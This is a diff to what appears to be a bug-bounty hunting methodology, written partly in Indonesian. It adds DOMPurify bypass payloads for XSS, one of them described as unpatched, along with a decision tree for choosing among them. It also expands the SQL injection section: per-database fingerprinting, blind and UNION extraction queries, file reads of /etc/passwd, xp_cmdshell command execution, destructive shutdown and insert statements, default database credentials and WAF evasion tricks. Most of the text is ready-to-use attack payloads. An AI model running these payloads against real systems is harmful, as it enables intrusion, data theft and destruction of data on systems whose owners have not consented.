@@ -876,45 +876,83 @@ Confirmed? → Phase 5: Escalate
 - Gunakan DOM Invader (Burp) untuk auto-detect sinks
 - Untuk kasus DOMPurify gunakan cara di bawah ini(Hanya Gunakan kalo target menggunakan DOMPurify, jika tidak skip cara dibawah)!
 
-DOMPurify Bypass
+### DOMPurify Bypass
 
-Beda dengan WAF: DOMPurify tidak block di network — payload masuk normal, tidak ada 403. Sanitasi terjadi di browser saat render. Kalau payload masuk tapi tidak execute → suspect DOMPurify atau client-side sanitasi lainnya.
+> Beda dengan WAF: DOMPurify tidak block di network — payload masuk normal, tidak ada 403. Sanitasi terjadi di browser saat render. Kalau payload masuk tapi tidak execute → suspect DOMPurify atau client-side sanitasi lainnya.
 
-Cara Detect DOMPurify
-javascript// Di browser DevTools Console:
+**Cara Detect DOMPurify:**
+```javascript
+// Di browser DevTools Console:
 DOMPurify.version   // cek versi
 
 // Atau grep source JS target:
 // curl -s https://target.com/app.js | grep -i "dompurify"
-Bypass 1 — SAFE_FOR_TEMPLATES + RETURN_DOM (fixed in 3.4.0)
-Sumber: @calif_io / @kinugawamasato via Codex
-Kondisi: Target pakai Vue/Angular + DOMPurify dengan opsi SAFE_FOR_TEMPLATES: true, RETURN_DOM: true
-Cara kerja: SAFE_FOR_TEMPLATES strip {{...}} agar tidak smuggle ke Vue. Tapi RETURN_DOM skip second check. Payload dipecah pakai junk <foo> tags → DOMPurify strip junk → pieces join kembali jadi {{...}} → Vue execute.
-html<span>{<foo></foo>{constructor.constructor("alert(1)")()|<foo></foo>}</span>
+```
+
+---
+
+**Bypass 1 — SAFE_FOR_TEMPLATES + RETURN_DOM (fixed in 3.4.0)**
+
+- Sumber: @calif_io / @kinugawamasato via Codex
+- Kondisi: Target pakai Vue/Angular + DOMPurify dengan opsi `SAFE_FOR_TEMPLATES: true, RETURN_DOM: true`
+- Cara kerja: `SAFE_FOR_TEMPLATES` strip `{{...}}` agar tidak smuggle ke Vue. Tapi `RETURN_DOM` skip second check. Payload dipecah pakai junk `<foo>` tags → DOMPurify strip junk → pieces join kembali jadi `{{...}}` → Vue execute.
+
+```html
+<span>{<foo></foo>{constructor.constructor("alert(1)")()|<foo></foo>}</span>
+```
+
 Verify di console:
-javascriptvar d = '<span>{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</span>';
+```javascript
+var d = '<span>{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</span>';
 document.getElementById('app').appendChild(
   DOMPurify.sanitize(d, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true })
 );
 new Vue({ el: '#app' });
+```
 
-Bypass 2 — selectedcontent re-clone (recent, unpatched)
-Sumber: @luckyhacker43 / KabirAcharya
-Kondisi: Browser yang support <selectedcontent> element (Chrome 135+)
-Payload:
-html<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>x</option></select>
-Cara kerja: <selectedcontent> adalah element baru yang meng-clone konten dari <option> terpilih ke dalam <button>. DOMPurify sanitize saat parse awal, tapi re-clone terjadi setelah sanitasi → XSS execute.
+---
 
-Bypass 3 — mXSS via namespace confusion (fixed in 2.4.0)
-html<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
-Bypass 4 — template element (fixed in 3.0.0)
-html<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
-Bypass 5 — DOM Clobbering (tidak di-sanitize DOMPurify)
+**Bypass 2 — selectedcontent re-clone (recent, unpatched)**
+
+- Sumber: @luckyhacker43 / KabirAcharya
+- Kondisi: Browser yang support `<selectedcontent>` element (Chrome 135+)
+- Cara kerja: `<selectedcontent>` meng-clone konten dari `<option>` terpilih ke dalam `<button>`. DOMPurify sanitize saat parse awal, tapi re-clone terjadi setelah sanitasi → XSS execute.
+
+```html
+<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>x</option></select>
+```
+
+---
+
+**Bypass 3 — mXSS via namespace confusion (fixed in 2.4.0)**
+
+```html
+<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
+```
+
+---
+
+**Bypass 4 — template element (fixed in 3.0.0)**
+
+```html
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+```
+
+---
+
+**Bypass 5 — DOM Clobbering (tidak di-sanitize DOMPurify)**
+
 Tidak inject JS langsung, tapi corrupt DOM API:
-html<form id=x><input id=attributes></form>
+```html
+<form id=x><input id=attributes></form>
+```
 Berguna untuk chain ke gadget lain di codebase target.
 
-Decision Tree DOMPurify
+---
+
+**Decision Tree DOMPurify:**
+
+```
 Payload masuk tapi tidak execute
     ↓
 Cek DOMPurify.version di console
@@ -925,6 +963,8 @@ Cek DOMPurify.version di console
 Latest  → coba selectedcontent re-clone (Bypass 2, Chrome 135+)
     ↓
 Semua gagal → coba DOM Clobbering → chain ke gadget
+```
+
 ---
 
 ### XSS Sinks (grep for these)
@@ -951,39 +991,82 @@ location.href = userInput
 - XSS + credential theft via fake login form = ATO
 - XSS in chatbot response = stored XSS chain
 
-
 ## SQL Injection
 
-> **Athul Mindset:** "Recon is everything — find input parameters that interact with the backend, test for error-based responses. Once you understand how databases handle malformed input, you start seeing injection points everywhere."
+> **Athul Mindset (@Athul_m_s):** "Recon is everything — I look for input parameters that interact with the backend, then test for error-based responses. Once you understand how databases handle malformed input, you start seeing injection points everywhere. Burp Suite + manual testing + patience."
+> Don't skip default pages (404, 403) — fuzz for hidden endpoints. Every input that touches the backend is a suspect.
 
----
+### Where to Hunt (All Input Points)
+
+| Input Type | Examples |
+|---|---|
+| GET params | `?id=`, `?search=`, `?page=`, `?cat=`, `?filter=`, `?sort=` |
+| POST body | form fields, JSON `{"id":1}`, XML |
+| HTTP Headers | `X-Forwarded-For`, `User-Agent`, `Referer`, Cookie values |
+| URL path | `/user/1/` → `/user/1'/` |
+| GraphQL variables | `{"variables":{"id":1}}` |
+| Search/filter/sort | Almost always hits DB directly |
 
 ### Phase 1 — DB Fingerprinting (Error-Based)
-Probe minimal dulu, catat error message:
 
-| DB | Error khas | Probe awal |
+| DB | Error Khas | Probe Awal |
 |---|---|---|
 | MySQL | `You have an error in your SQL syntax` | `'`, `"`, `1'-- -` |
 | PostgreSQL | `ERROR: unterminated quoted string` | `'::text`, `$$` |
 | MSSQL | `Unclosed quotation mark` | `';--`, `1;WAITFOR DELAY '0:0:5'--` |
-| Oracle | `ORA-01756` / `ORA-00933` | `'\|\|'a`, `1 AND 1=1--` |
+| Oracle | `ORA-01756` / `ORA-00933` | `` ` ``, `'` |
 | SQLite | `unrecognized token` | `'`, `1 AND 1=1` |
+| IBM DB2 | `DB2 SQL Error` | `'`, `1 AND 1=1` |
 
----
+**Default credentials per DB:**
 
-### Phase 2 — Time-Based Blind (kalau tidak ada error visible)
+| DB | Default Creds |
+|---|---|
+| Oracle | `scott/tiger`, `dbsnmp/dbsnmp` |
+| MySQL | `mysql/BLANK`, `root/BLANK` |
+| PostgreSQL | `postgres/BLANK` |
+| MS-SQL | `sa/BLANK` |
+| DB2 | `db2admin/db2admin` |
+
+### Phase 2 — Detection Payloads
+
+```sql
+-- Query syntax breaking
+'  "
+
+-- Comment injection
+-- (hyphens)   # (hash)   /* (comment)
+
+-- Extending queries
+;
+
+-- Bypass filters
+CHAR(), ASCII(), HEX(), CONCAT(), CAST(), CONVERT(), NULL
+```
+
+**Quick Check:**
+```sql
+AND 1=1
+AND 1=0
+' OR 1=1--
+' UNION SELECT NULL--
+'; SELECT 1/0--
+1+AND+USER_NAME()='dbo'
+```
+
+### Phase 3 — Time-Based Blind (kalau tidak ada error)
+
 ```sql
 -- MySQL
 ' AND SLEEP(5)-- -
-1' AND SLEEP(5)-- -
+BENCHMARK(1000000,MD5('test'))
 
 -- MSSQL
 '; WAITFOR DELAY '0:0:5'--
-1'; WAITFOR DELAY '0:0:5'--
+1;waitfor+delay+'0:0:10'
 
 -- PostgreSQL
 '; SELECT pg_sleep(5)--
-1' AND 1=(SELECT 1 FROM pg_sleep(5))--
 
 -- Oracle
 ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
@@ -992,30 +1075,62 @@ Probe minimal dulu, catat error message:
 ' AND 1=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
 ```
 
----
+### Phase 4 — Exploitation by DB
 
-### Detection
-```bash
-# Single quote test
-' OR '1'='1
-' OR 1=1--
+**MySQL:**
+```sql
+' ORDER BY 1--         -- find column count
 ' UNION SELECT NULL--
+' UNION SELECT version(),database(),user()--
+' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+LOAD_FILE('/etc/passwd')
+1'; insert into users values('nto','nto123')
+1';shutdown--
+```
 
-# Error-based detection
-'; SELECT 1/0--    # divide by zero error reveals SQLi
+**MSSQL:**
+```sql
+'; SELECT @@version--
+'; SELECT name FROM master..sysdatabases--
+'; SELECT name FROM master..syslogins--
+'; SELECT name FROM master..sysobjects WHERE xtype='U'--
+'; SELECT DB_NAME()--
+1;exec master..xp_cmdshell 'whoami'--
+```
+
+**Oracle:**
+```sql
+SELECT * from v$version
+SELECT * from dba_users
+SELECT table_name from all_tables
+SELECT distinct owner from all_tables
+SELECT column_name from all_tab_columns WHERE table_name='<TABLENAME>'
+SELECT user from dual
+```
+
+**PostgreSQL:**
+```sql
+SELECT version()
+SELECT * from pg_user
+```
+
+**IBM DB2:**
+```sql
+SELECT Versionnumber from sysibm.sysversions
+SELECT user from sysibm.sysdummy1
+SELECT name from sysibm.systables
+SELECT schemaname from syscat.schemata
 ```
 
 ### Modern SQLi WAF Bypass
+
 ```sql
--- Comment variation
 /*!50000 SELECT*/ * FROM users
 SE/**/LECT * FROM users
--- Case variation
 SeLeCt * FrOm uSeRs
--- URL encoding
 %27 OR %271%27=%271
--- Unicode apostrophe
-' OR '1'='1
+CHAR(), ASCII(), HEX(), CONCAT(), CAST(), CONVERT(), NULL
 ```
 
 ## GraphQL
